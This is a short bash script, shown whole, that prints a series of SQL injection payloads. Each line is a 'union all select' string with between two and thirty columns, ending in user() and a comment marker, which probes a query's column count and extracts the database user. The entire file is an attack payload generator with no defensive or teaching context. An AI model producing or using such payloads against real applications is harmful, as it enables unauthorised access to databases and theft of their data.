#!/bin/bash

str='1 union all select  user() #'

j="1,"

for i in `seq 2 30`
do 

j="$j $i,"

echo "1 union all select $j user() #"

done
